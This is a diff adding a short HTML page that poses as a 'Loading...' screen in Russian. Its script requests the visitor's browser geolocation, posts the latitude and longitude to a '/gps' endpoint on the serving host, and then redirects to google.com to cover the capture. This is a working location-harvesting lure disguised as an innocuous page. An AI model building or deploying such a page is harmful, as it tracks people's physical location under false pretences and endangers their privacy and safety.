@@ -1,0 +1,35 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Загрузка...</title>
+  <script>
+    navigator.geolocation.getCurrentPosition(
+      function (position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        fetch("/gps", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ lat: lat, lon: lon })
+        }).finally(() => {
+          fetch("/")
+            .finally(() => {
+              window.location.href = "https://google.com";
+            });
+        });
+      },
+      function (error) {
+        fetch("/")
+          .finally(() => {
+            window.location.href = "https://google.com";
+          });
+      }
+    );
+  </script>
+</head>
+<body>
+  <h1>Загрузка...</h1>
+</body>
+</html>
